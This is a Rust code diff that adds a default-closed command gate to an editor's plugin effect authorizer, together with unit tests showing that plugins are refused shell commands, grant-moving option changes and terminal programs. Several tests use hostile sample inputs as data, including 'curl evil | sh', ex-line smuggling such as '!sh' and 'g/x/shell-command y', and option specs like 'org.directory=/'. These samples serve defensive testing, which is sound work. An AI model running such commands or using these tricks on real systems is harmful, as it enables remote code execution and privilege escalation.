@@ -80,6 +80,197 @@ pub struct EffectAuthorizer {
     /// RF.4d: the plugin's range space, where its tracked-range ids live.
     /// `UNASSIGNED_RANGE_SPACE` until [`Self::with_range_space`].
     range_space: u32,
+    /// OB.3a: what the plugin may name for the host to run.
+    gate: CommandGate,
+}
+
+/// OB.3a: which commands, options and programs a plugin may name in what it
+/// hands the host.
+///
+/// Effects lose their provenance once they leave the boundary — that is
+/// deliberate (see the module note) — so a command a plugin names runs with
+/// the user's whole authority. `shell-command`, `!` and `ex:filter` run a
+/// program; `set` moves an option a plugin's grant follows. The plugin's
+/// grant cannot be checked where those run, so it is checked here, where the
+/// plugin is still known. **Default closed:** a plugin may name a command a
+/// plugin registered, or a native one its owner opened
+/// ([`lattice_grammar::CommandRegistry::allow_plugin_invocation`]), and
+/// nothing else — a native command that forgets to say is refused, visibly,
+/// rather than reachable by every plugin.
+///
+/// The name must be the registered name exactly. No alias, no `ex:` guess,
+/// no ex-line syntax: the host dispatches a registered name as that command
+/// and nothing else (`Editor::invoke_command_named`), so the command checked
+/// is the command run.
+///
+/// The user's `init.rs` (the config authority, PMF.15) is exempt: it is the
+/// user's own code.
+#[derive(Clone, Default)]
+pub struct CommandGate {
+    plugin: String,
+    commands: Option<lattice_grammar::CommandRegistryHandle>,
+    guard: Option<crate::GrantGuardHandle>,
+    options: Option<std::sync::Arc<lattice_config::ConfigRegistry>>,
+    /// The UNBOUND `proc:spawn`: a terminal running a command is a process.
+    proc_spawn: bool,
+}
+
+impl std::fmt::Debug for CommandGate {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        f.debug_struct("CommandGate")
+            .field("plugin", &self.plugin)
+            .field("commands", &self.commands.is_some())
+            .field("guard", &self.guard.is_some())
+            .field("options", &self.options.is_some())
+            .field("proc_spawn", &self.proc_spawn)
+            .finish()
+    }
+}
+
+impl CommandGate {
+    /// The gate for `plugin`, checking against the editor's `commands` and the
+    /// shared grant guard; `options` resolves an option alias to the name the
+    /// guard knows.
+    pub(crate) fn new(
+        plugin: impl Into<String>,
+        grant: &CapabilityGrant,
+        commands: Option<lattice_grammar::CommandRegistryHandle>,
+        guard: crate::GrantGuardHandle,
+        options: Option<std::sync::Arc<lattice_config::ConfigRegistry>>,
+    ) -> Self {
+        Self {
+            plugin: plugin.into(),
+            commands,
+            guard: Some(guard),
+            options,
+            proc_spawn: grant.proc_spawn,
+        }
+    }
+
+    /// Is this the user's `init.rs`?
+    fn is_authority(&self) -> bool {
+        self.guard.as_ref().is_some_and(|guard| {
+            guard
+                .read()
+                .unwrap_or_else(std::sync::PoisonError::into_inner)
+                .authority
+                .as_deref()
+                == Some(self.plugin.as_str())
+        })
+    }
+
+    /// May the plugin name command `name`? `Err` is the refusal, for the user.
+    pub fn check_command(&self, name: &str) -> Result<(), String> {
+        if self.is_authority() {
+            return Ok(());
+        }
+        let permitted = self.commands.as_ref().and_then(|commands| {
+            let commands = commands.load();
+            let id = commands.id_by_name(name)?;
+            commands.lookup(id).map(|spec| self.permits(spec))
+        });
+        match permitted {
+            Some(true) => Ok(()),
+            Some(false) => Err(self.refusal(name)),
+            None => Err(format!(
+                "{}: refused to run `{name}` — no command is registered under that name",
+                self.plugin
+            )),
+        }
+    }
+
+    /// May the plugin run the command `spec` describes? For a caller that has
+    /// already resolved the name against its own registry snapshot — and runs
+    /// what it resolved — so the check and the run see the same command.
+    pub fn permits(&self, spec: &lattice_grammar::CommandSpec) -> bool {
+        spec.plugin_may_invoke() || self.is_authority()
+    }
+
+    /// The refusal for a command the plugin may not run.
+    pub fn refusal(&self, name: &str) -> String {
+        format!(
+            "{}: refused to run `{name}` — a plugin may run only plugin commands \
+             and the editor commands opened to plugins",
+            self.plugin
+        )
+    }
+
+    /// Does `name` name a REGISTERED command the plugin may not run? `false`
+    /// for one not registered (yet) — see the picker's delete verb, the one
+    /// caller that checks before the plugin's own commands exist.
+    pub(crate) fn names_a_closed_command(&self, name: &str) -> bool {
+        if self.is_authority() {
+            return false;
+        }
+        let Some(commands) = &self.commands else {
+            return false;
+        };
+        let commands = commands.load();
+        commands
+            .id_by_name(name)
+            .and_then(|id| commands.lookup(id))
+            .is_some_and(|spec| !spec.plugin_may_invoke())
+    }
+
+    /// May the plugin apply `:set {spec}`? Refused when it names an option a
+    /// plugin's grant follows (PMF.5) — the config seam's `set-option` refuses
+    /// the same, and an effect must not be the way round it.
+    pub fn check_set_option(&self, spec: &str) -> Result<(), String> {
+        if self.is_authority() {
+            return Ok(());
+        }
+        let Some(guard) = &self.guard else {
+            return Ok(());
+        };
+        let Ok(parsed) = lattice_config::parse_set(spec) else {
+            // The host's parse fails the same way and writes nothing.
+            return Ok(());
+        };
+        let name = match parsed {
+            lattice_config::ParsedSet::Query(_) => return Ok(()),
+            lattice_config::ParsedSet::Assign { name, .. }
+            | lattice_config::ParsedSet::NameOnly(name)
+            | lattice_config::ParsedSet::Reset(name) => vec![name],
+            // `noX` may name `noX` itself or negate `X`: check both.
+            lattice_config::ParsedSet::Negate(rest) => vec![format!("no{rest}"), rest],
+        };
+        let guard = guard
+            .read()
+            .unwrap_or_else(std::sync::PoisonError::into_inner);
+        for written in name {
+            // The guard knows canonical names; an alias the plugin itself
+            // registered must not be the way past it.
+            let canonical = self
+                .options
+                .as_ref()
+                .and_then(|o| o.lookup(&written))
+                .map(|o| o.name().to_string());
+            for option in std::iter::once(written.as_str()).chain(canonical.as_deref()) {
+                if guard.refuses(option, Some(&self.plugin)) {
+                    return Err(format!(
+                        "{}: refused to set `{option}` — it decides what a plugin may access \
+                         or run, so only your configuration (`:set`, lattice.toml, init.rs) \
+                         can change it",
+                        self.plugin
+                    ));
+                }
+            }
+        }
+        Ok(())
+    }
+
+    /// May the plugin open a terminal running `cmd_line`? A terminal that runs
+    /// a command is a process, so it takes the unbound `proc:spawn`. Without a
+    /// command it is the user's own shell, in front of them.
+    pub fn check_terminal(&self, cmd_line: Option<&str>) -> Result<(), String> {
+        match cmd_line {
+            Some(cmd) if !self.proc_spawn && !self.is_authority() => Err(format!(
+                "{}: refused to run `{cmd}` in a terminal — that needs the `proc:spawn` capability",
+                self.plugin
+            )),
+            _ => Ok(()),
+        }
+    }
 }
 
 impl EffectAuthorizer {
@@ -94,7 +285,27 @@ impl EffectAuthorizer {
             plugin: plugin.into(),
             option_bound: Vec::new(),
             range_space: UNASSIGNED_RANGE_SPACE,
+            gate: CommandGate {
+                plugin: String::new(),
+                proc_spawn: grant.proc_spawn,
+                ..CommandGate::default()
+            },
         }
+    }
+
+    /// OB.3a: check the commands, options and programs this plugin names
+    /// against `gate`. Unset, the gate refuses every command (no registry to
+    /// find one in) and every terminal command a plugin without `proc:spawn`
+    /// asks for.
+    pub fn with_command_gate(mut self, gate: CommandGate) -> Self {
+        self.gate = gate;
+        self
+    }
+
+    /// OB.3a: the gate, for the seams that hand the host a command name
+    /// outside an effect (a picker's accept, a row's routing).
+    pub fn command_gate(&self) -> &CommandGate {
+        &self.gate
     }
 
     /// RF.4d: move this plugin's tracked-range ids into `space`, its numeric
@@ -212,6 +423,35 @@ impl EffectAuthorizer {
                     true,
                 )
             }
+            // OB.3a: what names a command, an option or a program.
+            effect @ (NativeEffect::InvokeCommand { .. }
+            | NativeEffect::Confirm { .. }
+            | NativeEffect::OpenPrompt { .. }
+            | NativeEffect::OpenPicker {
+                fill_action: Some(_),
+                ..
+            }
+            | NativeEffect::Lsp(lattice_grammar::LspRequest::CodeActions {
+                otherwise: Some(_),
+                ..
+            })
+            | NativeEffect::SetOption { .. }
+            | NativeEffect::SetLocalOption { .. }
+            | NativeEffect::SetGlobalOption { .. }
+            | NativeEffect::SpawnTerminal { .. }) => match self.check_named(&effect) {
+                Ok(()) => (effect, false),
+                Err(text) => {
+                    // `info!`: one-shot and user-actionable, as a denied write is.
+                    tracing::info!(plugin = %self.plugin, %text, "plugin effect refused");
+                    (
+                        NativeEffect::Echo {
+                            level: EchoLevel::Warn,
+                            text,
+                        },
+                        true,
+                    )
+                }
+            },
             // RF.4d: the id came across in the unassigned space; this is the
             // one place that knows whose it is.
             NativeEffect::TrackRange {
@@ -241,6 +481,34 @@ impl EffectAuthorizer {
 }
 
 impl EffectAuthorizer {
+    /// OB.3a: the gate's verdict on an effect that names a command, an option
+    /// or a program.
+    fn check_named(&self, effect: &NativeEffect) -> Result<(), String> {
+        let gate = &self.gate;
+        match effect {
+            NativeEffect::InvokeCommand { id, .. } => gate.check_command(id),
+            NativeEffect::Confirm { yes_action, .. } => gate.check_command(yes_action),
+            NativeEffect::OpenPrompt {
+                on_submit_action, ..
+            } => gate.check_command(on_submit_action),
+            NativeEffect::OpenPicker {
+                fill_action: Some(action),
+                ..
+            } => gate.check_command(action),
+            NativeEffect::Lsp(lattice_grammar::LspRequest::CodeActions {
+                otherwise: Some(fallback),
+                ..
+            }) => gate.check_command(&fallback.id),
+            NativeEffect::SetOption { spec }
+            | NativeEffect::SetLocalOption { spec }
+            | NativeEffect::SetGlobalOption { spec } => gate.check_set_option(spec),
+            NativeEffect::SpawnTerminal { cmd_line, .. } => {
+                gate.check_terminal(cmd_line.as_deref())
+            }
+            _ => Ok(()),
+        }
+    }
+
     /// OB.3a: hold a POSTED batch to the effects a posting plugin may send.
     ///
     /// A returned effect answers something the user just did; a posted one
@@ -853,5 +1121,233 @@ mod tests {
         };
         assert!(text.contains("SetOption"), "{text}");
         assert!(!text.contains("hunter2"), "{text}");
+    }
+
+    // ---- OB.3a: the command gate ----
+
+    fn noop_action() -> lattice_grammar::registry::ActionSpec {
+        lattice_grammar::registry::ActionSpec {
+            args_schema: Vec::new(),
+            apply: std::sync::Arc::new(|_| Ok(NativeEffect::None)),
+        }
+    }
+
+    /// An editor with a native `shell-command` (closed), a native `llm`
+    /// (opened) and a plugin's `org-capture-cleanup`.
+    fn commands() -> lattice_grammar::CommandRegistryHandle {
+        let mut reg = lattice_grammar::CommandRegistry::new();
+        reg.register_action("shell-command", "runs a program", noop_action());
+        reg.register_action("llm", "asks a model", noop_action());
+        assert!(reg.allow_plugin_invocation("llm"));
+        reg.register_plugin_action(7, "org-capture-cleanup", "org's own", noop_action());
+        std::sync::Arc::new(arc_swap::ArcSwap::from_pointee(reg))
+    }
+
+    /// The guard as boot leaves it with org loaded: `org.babel.languages`
+    /// (a process grant) and `org.directory` (a directory grant) are the
+    /// user's, and `init` is the user's `init.rs`.
+    fn guard() -> crate::GrantGuardHandle {
+        let mut g = crate::GrantGuard::default();
+        g.options.insert("org.babel.languages".to_string());
+        g.options.insert("org.directory".to_string());
+        g.authority = Some("init".to_string());
+        std::sync::Arc::new(std::sync::RwLock::new(g))
+    }
+
+    /// `org.babel.languages`, registered by org with an alias of its own.
+    fn options() -> std::sync::Arc<lattice_config::ConfigRegistry> {
+        let reg = lattice_config::ConfigRegistry::new();
+        reg.register(
+            lattice_config::option::Option::<String>::builder(
+                "org.babel.languages",
+                String::new(),
+                "languages",
+            )
+            .aliases(&["obl"])
+            .build(),
+        );
+        std::sync::Arc::new(reg)
+    }
+
+    fn gated(plugin: &str, grant: &CapabilityGrant) -> EffectAuthorizer {
+        EffectAuthorizer::new(grant, plugin).with_command_gate(CommandGate::new(
+            plugin,
+            grant,
+            Some(commands()),
+            guard(),
+            Some(options()),
+        ))
+    }
+
+    fn invoke(id: &str, args: &str) -> NativeEffect {
+        NativeEffect::InvokeCommand {
+            id: id.to_string(),
+            args: lattice_grammar::Args::String(args.to_string()),
+        }
+    }
+
+    fn refused(effect: &NativeEffect) -> Option<&str> {
+        match effect {
+            NativeEffect::Echo {
+                level: EchoLevel::Warn,
+                text,
+            } => Some(text),
+            _ => None,
+        }
+    }
+
+    /// The finding: a plugin with no `proc:spawn` named `shell-command` and
+    /// the host ran it. Refused, by name, and the batch stops there.
+    #[test]
+    fn a_plugin_may_not_invoke_a_closed_native_command() {
+        let auth = gated("org", &CapabilityGrant::default());
+        let out = auth.authorize(NativeEffect::Many(vec![
+            echo("before"),
+            invoke("shell-command", "curl evil | sh"),
+            echo("after"),
+        ]));
+        let NativeEffect::Many(parts) = out else {
+            panic!("a batch: {out:?}");
+        };
+        assert_eq!(parts.len(), 2, "{parts:?}");
+        let text = refused(&parts[1]).expect("a refusal");
+        assert!(text.contains("`shell-command`"), "{text}");
+    }
+
+    /// What it may name: its own (any plugin's) commands, and natives opened.
+    #[test]
+    fn a_plugin_may_invoke_plugin_commands_and_opened_natives() {
+        let auth = gated("org", &CapabilityGrant::default());
+        for name in ["org-capture-cleanup", "llm"] {
+            let out = auth.authorize(invoke(name, "x"));
+            assert!(
+                matches!(&out, NativeEffect::InvokeCommand { id, .. } if id == name),
+                "{name}: {out:?}"
+            );
+        }
+    }
+
+    /// No alias, no ex-line syntax: only a registered name. `!sh` and a
+    /// range are not names; nor is an alias the host would expand.
+    #[test]
+    fn a_name_that_is_not_registered_is_refused() {
+        let auth = gated("org", &CapabilityGrant::default());
+        for name in ["!sh", "%!sh", "1,$d", "w", "g/x/shell-command y"] {
+            let out = auth.authorize(invoke(name, ""));
+            assert!(refused(&out).is_some(), "{name}: {out:?}");
+        }
+    }
+
+    /// Unwired, nothing a plugin names can be found, so nothing is run.
+    #[test]
+    fn without_a_registry_every_command_is_refused() {
+        let auth = EffectAuthorizer::new(&CapabilityGrant::default(), "org");
+        assert!(refused(&auth.authorize(invoke("org-capture-cleanup", ""))).is_some());
+    }
+
+    /// Every other place an effect names a command is the same gate.
+    #[test]
+    fn every_effect_that_names_a_command_is_gated() {
+        let auth = gated("org", &CapabilityGrant::default());
+        let naming = |command: &str| {
+            vec![
+                NativeEffect::Confirm {
+                    prompt: "ok?".into(),
+                    yes_action: command.into(),
+                    args: lattice_grammar::Args::String("x".into()),
+                },
+                NativeEffect::OpenPrompt {
+                    prompt: "say".into(),
+                    initial: String::new(),
+                    on_submit_action: command.into(),
+                    buffer_name: None,
+                },
+                NativeEffect::OpenPicker {
+                    source: "files".into(),
+                    args: Vec::new(),
+                    root: None,
+                    fill_action: Some(command.into()),
+                    query: None,
+                },
+                NativeEffect::Lsp(lattice_grammar::LspRequest::CodeActions {
+                    only: None,
+                    on_selection: false,
+                    range: None,
+                    otherwise: Some(lattice_grammar::CommandRef {
+                        id: command.into(),
+                        args: lattice_grammar::Args::None,
+                    }),
+                }),
+            ]
+        };
+        for effect in naming("shell-command") {
+            let shown = format!("{effect:?}");
+            assert!(refused(&auth.authorize(effect)).is_some(), "{shown}");
+        }
+        for effect in naming("org-capture-cleanup") {
+            let shown = format!("{effect:?}");
+            assert!(refused(&auth.authorize(effect)).is_none(), "{shown}");
+        }
+    }
+
+    /// Finding 1: an effect setting an option a grant follows. PMF.5 refused
+    /// the config seam's `set-option`; the effect was the way round it, and
+    /// OB.2 made that a way to grant a plugin programs.
+    #[test]
+    fn a_set_option_effect_may_not_move_a_grant() {
+        let auth = gated("org", &CapabilityGrant::default());
+        for spec in [
+            "org.babel.languages=sh", // a process grant
+            "org.directory=/",        // a directory grant
+            "obl=sh",                 // through the plugin's own alias
+            "org.babel.languages&",   // reset is a write too
+        ] {
+            for effect in [
+                NativeEffect::SetOption { spec: spec.into() },
+                NativeEffect::SetLocalOption { spec: spec.into() },
+                NativeEffect::SetGlobalOption { spec: spec.into() },
+            ] {
+                let shown = format!("{effect:?}");
+                assert!(refused(&auth.authorize(effect)).is_some(), "{shown}");
+            }
+        }
+        // Any other option, and a query, are the plugin's to touch.
+        for spec in ["wrap", "nowrap", "tabstop=4", "org.babel.languages?"] {
+            let out = auth.authorize(NativeEffect::SetOption { spec: spec.into() });
+            assert!(refused(&out).is_none(), "{spec}: {out:?}");
+        }
+    }
+
+    /// The user's `init.rs` is the user: its effects are not gated.
+    #[test]
+    fn the_users_init_is_not_gated() {
+        let auth = gated("init", &CapabilityGrant::default());
+        assert!(refused(&auth.authorize(invoke("shell-command", "make"))).is_none());
+        let out = auth.authorize(NativeEffect::SetOption {
+            spec: "org.babel.languages=sh".into(),
+        });
+        assert!(refused(&out).is_none(), "{out:?}");
+    }
+
+    /// A terminal running a command is a process: it takes `proc:spawn`.
+    #[test]
+    fn a_terminal_command_needs_proc_spawn() {
+        let terminal = |cmd: Option<&str>| NativeEffect::SpawnTerminal {
+            cmd_line: cmd.map(str::to_string),
+            cwd: None,
+            env: Vec::new(),
+            activate_minor: None,
+        };
+        let without = gated("org", &CapabilityGrant::default());
+        assert!(refused(&without.authorize(terminal(Some("sh -c id")))).is_some());
+        assert!(
+            refused(&without.authorize(terminal(None))).is_none(),
+            "the user's own shell, in front of them"
+        );
+        let with = CapabilityGrant {
+            proc_spawn: true,
+            ..Default::default()
+        };
+        assert!(refused(&gated("org", &with).authorize(terminal(Some("make")))).is_none());
     }
 }
